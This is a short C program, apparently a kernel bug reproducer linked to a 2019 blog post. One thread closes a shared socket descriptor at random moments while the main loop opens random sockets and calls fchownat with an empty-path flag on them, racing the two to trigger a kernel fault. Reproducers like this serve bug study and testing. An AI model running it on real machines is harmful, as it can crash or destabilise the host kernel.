// https://blog.lovetecnet.xyz/2019/03/5ed110028577930534277164/
#include <pthread.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <unistd.h>

pthread_t t;
volatile int fd;

void *close_thread(void *arg)
{
    for (;;) {
        usleep(rand() % 100);
        close(fd);
    }
}

int main()
{
    pthread_create(&t, NULL, close_thread, NULL);
    for (;;) {
            fd = socket(rand() % 50, rand() % 11, 0);
        fchownat(fd, "", 1000, 1000, 0x1000);
        close(fd);
    }
}
